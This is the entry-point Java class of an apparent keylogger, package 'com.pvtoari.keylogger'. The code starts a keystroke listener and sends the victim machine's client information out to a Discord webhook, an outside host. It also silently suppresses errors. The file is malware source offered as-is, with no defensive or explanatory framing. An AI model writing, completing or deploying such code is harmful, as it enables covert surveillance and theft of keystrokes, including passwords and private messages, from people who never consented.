package com.pvtoari.keylogger;

import java.io.IOException;

public class Main {
    static DiscordWebhook webhook = new DiscordWebhook(Config.WEBHOOK);
    public static void main(String[] args) {
        Listener listener = new Listener();

        webhook.setContent("```Running..." + "\\n" + listener.getClientInfo() + "```\\n");
        try {
            webhook.execute();
        } catch (IOException e) {
            //e.printStackTrace();
        }

        listener.start();
    }
}
